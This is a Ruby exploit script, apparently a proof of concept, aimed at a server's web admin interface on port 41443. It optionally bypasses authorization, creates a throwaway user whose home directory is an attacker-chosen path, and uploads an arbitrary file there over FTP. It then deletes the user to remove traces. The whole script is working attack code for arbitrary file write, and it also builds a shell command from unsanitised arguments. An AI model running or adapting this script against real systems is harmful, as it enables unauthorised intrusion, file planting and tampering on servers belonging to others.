require './librhea.rb'

if ARGV.length < 3 || ARGV.length == 4
  $stderr.puts 'Usage:'
  $stderr.puts
  $stderr.puts "#{$1} <target ip> <local file path> <remote file path> [username] [password]"
  $stderr.puts
  $stderr.puts "(If username:password are omitted, we attempt to bypass authorization)"
  exit 1
end

# Set things up
TARGET = ARGV[0]
LOCAL_FILE  = ARGV[1]
REMOTE_PATH, REMOTE_FILE = File.split(ARGV[2])
USERNAME    = ARGV[3]
PASSWORD    = ARGV[4]

BASE_URL = "https://#{ARGV[0]}:41443"
puts "Establishing a session on #{BASE_URL}"
RHEA = LibRhea::new(BASE_URL, USERNAME, PASSWORD)

# Generate random creds
NEW_USERNAME = (0...16).map { (0x61 + rand(26)).chr }.join
NEW_PASSWORD = (0...16).map { (0x61 + rand(26)).chr }.join

# Create a new user with those creds
puts
puts "Creating a user (username = #{NEW_USERNAME}, password = #{NEW_PASSWORD}, home_dir = #{REMOTE_PATH})..."
NEW_UUID = RHEA.create_user(
  username: NEW_USERNAME,
  password: NEW_PASSWORD,
  home_dir: REMOTE_PATH,
)
puts
puts "User created with uuid = #{NEW_UUID})"

# This uses the ncftp CLI to upload a file. That's not the _best_ way, but it
# works
puts "Uploading #{LOCAL_FILE} to #{REMOTE_PATH}/#{REMOTE_FILE}"
out = `echo 'put -z #{LOCAL_FILE} #{REMOTE_FILE}' | ncftp -u '#{NEW_USERNAME}' -p '#{NEW_PASSWORD}' '#{TARGET}' 2>/dev/null`

if out =~ /Requested action not taken/im
  $stderr.puts
  $stderr.puts "Something went wrong uploading the file! This usually happens because you can't use the same home directory twice without restarting the server process"
  exit 1
end

if out =~ /was not accepted/im
  $stderr.puts
  $stderr.puts "Something went wrong uploading the file! The FTP username/password didn't work, which means the user didn't get created"
  exit 1
end

puts
puts "File likely uploaded! Deleting the new user..."

RHEA.delete_user(
  username: NEW_USERNAME,
  uuid: NEW_UUID,
)
